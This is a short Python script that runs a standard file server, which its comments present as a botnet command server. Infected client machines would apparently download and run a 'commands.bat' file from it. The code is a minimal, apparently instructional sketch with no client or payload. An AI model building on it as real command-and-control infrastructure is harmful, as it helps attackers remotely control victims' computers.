import http.server
import socketserver

"""
Simple botnet server - you can put files in the sub folder "botnet_files"

This would run out in the cloud somewhere - the client app would be running on the infected machine and would connect to this server to get commands

The client app will ask for the /commands.bat file and run it
"""

# Port to bind/listen on - To use standard web ports, we could put this on 80 or 443, but that would require root/admin privileges
PORT = 8000
DIRECTORY = "./botnet_files"

# This part runs to handle web requests - right now it just serves files from the botnet_files folder
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)

# Start the server
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Serving files from {DIRECTORY} at http://localhost:{PORT}")
    httpd.serve_forever()
